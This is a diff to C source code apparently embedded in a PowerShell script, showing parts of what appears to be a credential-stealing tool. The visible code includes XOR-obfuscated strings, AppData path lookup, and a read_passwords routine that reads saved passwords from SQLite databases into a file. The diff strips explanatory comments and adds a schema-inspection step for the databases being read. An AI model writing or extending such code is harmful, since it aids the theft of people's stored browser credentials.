@@ -9,16 +9,16 @@ $cCode = @"
 #include <stdlib.h>
 #include <string.h>
 #include <windows.h>
-#include <shlobj.h> // Include this header for SHGetFolderPathA and CSIDL_APPDATA
-#include "sqlite3.h" // Include SQLite header
+#include <shlobj.h>
+#include "sqlite3.h"
 
 #ifndef _WIN32_WINNT
-#define _WIN32_WINNT 0x0500 // Define this to use SHGetFolderPathA
+#define _WIN32_WINNT 0x0500
 #endif
 
 void decrypt(char *str) {
     while (*str) {
-        *str = *str ^ 0xAA; // Simple XOR decryption
+        *str = *str ^ 0xAA;
         str++;
     }
 }
@@ -67,6 +67,24 @@ void read_passwords(sqlite3 *db, FILE *file) {
     sqlite3_finalize(res);
 }
 
+void inspect_schema(sqlite3 *db) {
+    sqlite3_stmt *res;
+    const char *sql = "SELECT name FROM sqlite_master WHERE type='table'";
+    int rc = sqlite3_prepare_v2(db, sql, -1, &res, 0);
+
+    if (rc != SQLITE_OK) {
+        fprintf(stderr, "Failed to inspect schema: %s\n", sqlite3_errmsg(db));
+        return;
+    }
+
+    printf("Tables in the database:\n");
+    while (sqlite3_step(res) == SQLITE_ROW) {
+        printf("%s\n", sqlite3_column_text(res, 0));
+    }
+
+    sqlite3_finalize(res);
+}
+
 void read_database(const char *db_path, void (*read_func)(sqlite3 *, FILE *), FILE *file) {
     sqlite3 *db;
     int rc = sqlite3_open(db_path, &db);
@@ -76,6 +94,8 @@ void read_database(const char *db_path, void (*read_func)(sqlite3 *, FILE *), FI
         return;
     }
 
+    printf("Reading database: %s\n", db_path);
+    inspect_schema(db); // Inspect the schema before reading
     read_func(db, file);
     sqlite3_close(db);
 }
